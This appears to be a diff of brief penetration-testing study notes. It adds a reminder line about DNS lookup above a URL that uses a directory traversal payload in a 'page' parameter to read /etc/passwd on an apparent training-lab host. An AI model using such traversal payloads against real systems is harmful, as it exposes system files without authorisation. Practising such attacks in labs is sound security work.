@@ -1,3 +1,5 @@
+Check the IP and see which DNS name associated with.
+
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 
 
